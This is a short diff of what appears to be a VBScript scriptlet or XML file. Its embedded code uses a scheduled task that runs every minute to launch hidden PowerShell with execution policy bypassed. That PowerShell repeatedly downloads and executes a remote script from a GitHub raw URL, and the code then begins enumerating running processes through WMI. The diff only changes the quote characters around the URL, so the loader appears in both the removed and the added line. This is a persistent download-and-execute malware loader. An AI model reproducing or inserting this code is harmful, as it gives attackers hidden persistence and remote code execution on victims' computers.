@@ -15,7 +15,7 @@
 		<![CDATA[
 		
 		 Set ws=CreateObject("WScript.Shell")
-ws.Run "SchTasks /Create /SC MINUTE /TN x /TR ""powershell.exe -ExecutionPolicy Bypass -w hidden -noexit -c while($true){IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/riyantigomez/gomez22/master/00.ps1'))}"" /f", 0, vbhide
+ws.Run "SchTasks /Create /SC MINUTE /TN x /TR ""powershell.exe -ExecutionPolicy Bypass -w hidden -noexit -c while($true){IEX((new-object net.webclient).downloadstring(’https://raw.githubusercontent.com/riyantigomez/gomez22/master/00.ps1’))}"" /f", 0, vbhide
  
 Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
 Dim colProcesses : Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process")
